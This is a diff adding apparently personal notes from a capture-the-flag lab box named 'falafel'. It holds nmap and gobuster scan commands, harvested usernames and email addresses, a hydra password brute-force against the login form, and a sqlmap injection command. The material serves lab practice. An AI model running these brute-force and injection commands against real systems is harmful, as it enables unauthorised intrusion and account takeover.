@@ -1,0 +1,15 @@
+nmap -sC -sV -Pn 10.129.1.83  > nmap.txt
+gobuster dir  -u http://10.129.1.83 / -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php  > gobuster.txt
+
+IT@falafel.htb
+admin@falafel.htb
+lawyers@falafel.htb
+devs@falafel.htb
+chris@falafel.htb
+
+chris
+
+
+Wrong identification : admin
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 10.129.1.83 http-post-form "/login.php:username=admin&password=^PASS^:Wrong identification"
+sqlmap --dbms=mysql -u "http://10.129.1.83/login.php?=query&wpas_keys=1"  --dbms MYSQL
